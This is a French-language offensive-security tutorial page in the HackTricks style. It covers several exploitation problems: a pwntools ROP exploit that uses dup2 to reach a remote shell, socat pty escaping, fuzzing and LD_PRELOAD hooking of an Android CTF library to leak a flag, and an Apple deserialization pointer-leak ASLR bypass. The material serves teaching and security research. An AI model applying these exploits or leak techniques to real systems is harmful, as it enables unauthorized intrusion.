# Common Exploiting Problems

{{#include ../banners/hacktricks-training.md}}

## FDs in Remote Exploitation

Lorsque vous envoyez un exploit à un serveur distant qui appelle **`system('/bin/sh')`** par exemple, cela sera exécuté dans le processus serveur bien sûr, et `/bin/sh` attendra des entrées depuis stdin (FD: `0`) et affichera la sortie sur stdout et stderr (FDs `1` et `2`). Donc l'attaquant ne pourra pas interagir avec le shell.

Une façon de résoudre cela est de supposer qu'au démarrage le serveur a créé le **numéro de FD `3`** (pour l'écoute) et que votre connexion se retrouvera dans le **numéro de FD `4`**. Par conséquent, il est possible d'utiliser le syscall **`dup2`** pour dupliquer stdin (FD 0) et stdout (FD 1) vers le FD 4 (celui de la connexion de l'attaquant), ce qui permettra de contacter le shell une fois exécuté.

[**Exploit example from here**](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit):
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = remote('localhost', 9001)

rop = ROP(elf)
rop.raw('A' * 40)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.win()

p.sendline(rop.chain())
p.recvuntil('Thanks!\x00')
p.interactive()
```
## Socat & pty

Notez que socat transfère déjà **`stdin`** et **`stdout`** vers le socket. Cependant, le mode `pty` **inclut des caractères DELETE**. Donc, si vous envoyez un `\x7f` (`DELETE`), il va **supprimer le caractère précédent** de votre exploit.

Pour contourner cela, le **caractère d'échappement `\x16` doit être préfixé à tout `\x7f` envoyé.**

**Vous pouvez** [**trouver un exemple de ce comportement**](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)**.**

## Android AArch64 bibliothèque partagée fuzzing & LD_PRELOAD hooking

When an Android app ships only a stripped AArch64 `.so`, you can still fuzz exported logic directly on-device without rebuilding the APK. A practical workflow:

1. **Localiser les points d'entrée appelables.** `objdump -T libvalidate.so | grep -E "validate"` liste rapidement les fonctions exportées. Les décompilateurs (Ghidra, IDA, BN) révèlent la signature réelle, p. ex. `int validate(const uint8_t *buf, uint64_t len)`.
2. **Écrire un harness autonome.** Charger un fichier, garder le buffer vivant, et appeler le symbole exporté exactement comme le ferait l'app. Cross-compile avec le NDK (p. ex. `aarch64-linux-android21-clang harness.c -L. -lvalidate -fPIE -pie`).

<details>
<summary>Harness minimal basé sur fichier</summary>
```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>

extern int validate(const uint8_t *buf, uint64_t len);

int main(int argc, char **argv) {
if (argc < 2) return 1;
int fd = open(argv[1], O_RDONLY);
if (fd < 0) return 1;
struct stat st = {0};
if (fstat(fd, &st) < 0) return 1;
uint8_t *buffer = malloc(st.st_size + 1);
read(fd, buffer, st.st_size);
close(fd);
int ret = validate(buffer, st.st_size);
free(buffer);
return ret;
}
```
</details>

3. **Reconstruire la structure attendue.** Les messages d'erreur et les comparaisons dans Ghidra montraient que la fonction analysait du JSON strict avec des clés constantes (`magic`, `version`, imbriquées `root.children.*`) et des vérifications arithmétiques (par ex., `value * 2 == 84` ⇒ `value` doit être `42`). Fournir du JSON syntaxiquement valide qui satisfait progressivement chaque branche permet de cartographier le schéma sans instrumentation.
4. **Bypass anti-debug to leak secrets.** Parce que le `.so` importe `snprintf`, remplacez-le via `LD_PRELOAD` pour extraire les chaînes de format sensibles même lorsque les breakpoints sont bloqués :

<details>
<summary>Minimal snprintf leak hook</summary>
```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>

typedef int (*vsnprintf_t)(char *, size_t, const char *, va_list);

int snprintf(char *str, size_t size, const char *fmt, ...) {
static vsnprintf_t real_vsnprintf;
if (!real_vsnprintf)
real_vsnprintf = (vsnprintf_t)dlsym(RTLD_NEXT, "vsnprintf");

va_list args;
va_start(args, fmt);
va_list args_copy;
va_copy(args_copy, args);
if (fmt && strstr(fmt, "MHL{")) {
fprintf(stdout, "[LD_PRELOAD] flag: ");
vfprintf(stdout, fmt, args);
fputc('\n', stdout);
}
int ret = real_vsnprintf(str, size, fmt, args_copy);
va_end(args_copy);
va_end(args);
return ret;
}
```
</details>

`LD_PRELOAD=./hook.so ./validate_harness payload.json` exfiltre le flag interne et confirme le crash oracle sans modifier le binaire.
5. **Réduire l'espace de fuzz.** Le désassemblage a révélé une clé XOR réutilisée dans la comparaison du `flag`, ce qui signifie que les sept premiers octets de `flag` étaient connus. Ne fuzz que les neuf octets inconnus.
6. **Incorporer les octets de fuzz dans une enveloppe JSON valide.** Le harness AFL lit exactement neuf octets depuis `stdin`, les copie dans le suffixe du `flag`, et hard-code tous les autres champs (constantes, profondeurs d'arbre, préimage arithmétique). Toute lecture malformée se termine simplement, donc AFL consacre ses cycles à des cas de test significatifs :

<details>
<summary>Minimal AFL harness</summary>
```c
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

extern int validate(unsigned char *bytes, size_t len);

#define FUZZ_SIZE 9

int main(void) {
uint8_t blob[FUZZ_SIZE];
if (read(STDIN_FILENO, blob, FUZZ_SIZE) != FUZZ_SIZE) return 0;
char suffix[FUZZ_SIZE + 1];
memcpy(suffix, blob, FUZZ_SIZE);
suffix[FUZZ_SIZE] = '\0';
char json[512];
int len = snprintf(json, sizeof(json),
"{\"magic\":16909060,\"version\":1,\"padding\":0,\"flag\":\"MHL{827b07c%s}\"," \
"\"root\":{\"type\":16,\"level\":3,\"num_children\":1,\"children\":[" \
"{\"type\":32,\"level\":2,\"num_children\":1,\"subchildren\":[" \
"{\"type\":48,\"level\":1,\"num_children\":1,\"leaves\":[" \
"{\"type\":64,\"level\":0,\"reserved\":0,\"value\":42}]}}]}}",
suffix);
if (len <= 0 || (size_t)len >= sizeof(json)) return 0;
validate((unsigned char *)json, len);
return 0;
}
```
</details>

7. **Run AFL with the crash-as-success oracle.** Any input that satisfies every semantic check and guesses the correct nine-byte suffix triggers the deliberate crash; those files land in `output/crashes` and can be replayed through the simple harness to recover the secret.

Ce workflow vous permet de trier rapidement les validateurs JNI protégés anti-debug, leak secrets lorsque nécessaire, puis fuzz uniquement les octets significatifs, le tout sans toucher l'APK original.

## Tables de hachage indexées par pointeur — Pointer Leaks sur Apple Serialization

### Exigences et surface d'attaque

- Un service accepte des property lists contrôlées par l'attaquant (XML ou binary) et appelle `NSKeyedUnarchiver.unarchivedObjectOfClasses` avec une allowlist permissive (par ex., `NSDictionary`, `NSArray`, `NSNumber`, `NSString`, `NSNull`).
- Les objets résultants sont réutilisés puis sérialisés à nouveau avec `NSKeyedArchiver` (ou itérés selon un ordre de buckets déterministe) et renvoyés à l'attaquant.
- Un type de clé dans les conteneurs utilise des valeurs de pointeur comme code de hash. Avant mars 2025, `CFNull`/`NSNull` retombaient sur `CFHash(object) == (uintptr_t)object`, et la désérialisation retournait toujours le singleton du shared-cache `kCFNull`, fournissant un pointeur partagé par le kernel stable sans corruption mémoire ni timing.

### Controllable hashing primitives

- **Pointer-based hashing:** `CFNull`’s `CFRuntimeClass` n'a pas de callback de hash, donc `CFBasicHash` utilise l'adresse de l'objet comme hash. Parce que le singleton vit à une adresse fixe du shared-cache jusqu'au reboot, son hash est stable entre les processus.
- **Attacker-controlled hashes:** les clés `NSNumber` 32-bit sont hashées via `_CFHashInt`, qui est déterministe et controllable par l'attaquant. Choisir des entiers spécifiques permet à l'attaquant de choisir `hash(number) % num_buckets` pour n'importe quelle taille de table.
- **`NSDictionary` implementation:** Les dictionnaires immuables incorporent un `CFBasicHash` avec un nombre de buckets premier choisi depuis `__CFBasicHashTableSizes` (par ex., 23, 41, 71, 127, 191, 251, 383, 631, 1087). Les collisions sont gérées par linear probing (`__kCFBasicHashLinearHashingValue`), et la sérialisation parcourt les buckets dans l'ordre numérique ; par conséquent, l'ordre des clés sérialisées encode l'indice de bucket que chaque clé occupe finalement.

### Encoding bucket indices into serialization order

En créant un plist qui matérialise un dictionary dont les buckets alternent entre emplacements occupés et vides, l'attaquant contraint où le linear probing peut placer `NSNull`. Pour un exemple à 7 buckets, remplir les buckets pairs avec des clés `NSNumber` produit :
```text
bucket:          0 1 2 3 4 5 6
occupancy:       # _ # _ # _ #
```
Pendant la désérialisation la victime insère la clé unique `NSNull`. Son bucket initial est `hash(NSNull) % 7`, mais le probing avance jusqu'à atteindre l'un des indices ouverts {1,3,5}. L'ordre des clés sérialisées révèle quel slot a été utilisé, divulguant si le hash du pointeur modulo 7 se trouve dans {6,0,1}, {2,3}, ou {4,5}. Parce que l'attaquant contrôle l'ordre sérialisé original, la clé `NSNull` est émise en dernier dans le plist d'entrée, donc l'ordre post-reserialization est uniquement une fonction du placement de bucket.

### Résolution des résidus exacts avec des tables complémentaires

Un seul dictionnaire ne leaks qu'une plage de résidus. Pour déterminer la valeur précise de `hash(NSNull) % p`, construisez **deux** dictionnaires par taille de bucket premier `p` : l'un avec les buckets pairs pré-remplis et l'autre avec les buckets impairs pré-remplis. Pour le motif complémentaire (`_ # _ # _ # _`), les slots vides (0,2,4,6) correspondent aux ensembles de résidus {0}, {1,2}, {3,4}, {5,6}. Observer la position sérialisée de `NSNull` dans les deux dictionnaires réduit la possibilité à une seule valeur parce que l'intersection des deux ensembles candidats donne un unique `r_i` pour ce `p`.

L'attaquant regroupe tous les dictionnaires dans un `NSArray`, donc un seul aller-retour deserialize → serialize leaks des résidus pour chaque taille de table choisie.

### Reconstruction du pointeur shared-cache 64 bits

Pour chaque premier `p_i ∈ {23, 41, 71, 127, 191, 251, 383, 631, 1087}`, l'attaquant récupère `hash(NSNull) ≡ r_i (mod p_i)` à partir de l'ordre sérialisé. L'application du Théorème des restes chinois (CRT) avec l'algorithme d'Euclide étendu donne :
```text
Π p_i = 23·41·71·127·191·251·383·631·1087 = 0x5ce23017b3bd51495 > 2^64
```
ainsi, le résidu combiné correspond de façon unique au pointeur 64-bit vers `kCFNull`. Le PoC de Project Zero combine itérativement des congruences tout en affichant les modules intermédiaires pour montrer la convergence vers l'adresse réelle (`0x00000001eb91ab60` sur la build vulnérable).

### Flux de travail pratique

1. **Générer l'entrée forgée :** Construire le plist XML côté attaquant (deux dictionnaires par prime, `NSNull` sérialisé en dernier) et le convertir en format binaire.
```bash
clang -o attacker-input-generator attacker-input-generator.c
./attacker-input-generator > attacker-input.plist
plutil -convert binary1 attacker-input.plist
```
2. **Aller‑retour de la victime :** Le service victime désérialise avec `NSKeyedUnarchiver.unarchivedObjectOfClasses` en utilisant l'ensemble de classes autorisées `{NSDictionary, NSArray, NSNumber, NSString, NSNull}` et ré‑sérialise immédiatement avec `NSKeyedArchiver`.
3. **Extraction du résidu :** La conversion du plist retourné en XML révèle l'ordre des clés des dictionnaires. Un outil d'aide tel que `extract-pointer.c` lit la table d'objets, détermine l'index du singleton `NSNull`, associe chaque paire de dictionnaires à son résidu de bucket, et résout le système CRT pour récupérer le pointeur du shared-cache.
4. **Vérification (optionnel) :** Compiler un petit utilitaire Objective-C qui affiche `CFHash(kCFNull)` confirme que la valeur leaked correspond à l'adresse réelle.

Aucun bug de sécurité mémoire n'est requis — observer simplement l'ordre de sérialisation des pointer-keyed structures permet d'obtenir une primitive de contournement ASLR à distance.

## Related pages

{{#ref}}
../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

{{#ref}}
../reversing/reversing-tools-basic-methods/README.md
{{#endref}}

## Références

- [FD duplication exploit example](https://ir0nstone.gitbook.io/notes/types/stack/exploiting-over-sockets/exploit)
- [Socat delete-character behaviour](https://ir0nstone.gitbook.io/hackthebox/challenges/pwn/dream-diary-chapter-1/unlink-exploit)
- [FuzzMe – Reverse Engineering and Fuzzing an Android Shared Library](https://hackmd.io/@sal/fuzzme-mobilehackinglab-ctf-writeup)
- [Pointer leaks through pointer-keyed data structures (Project Zero)](https://projectzero.google/2025/09/pointer-leaks-through-pointer-keyed.html)

{{#include ../banners/hacktricks-training.md}}
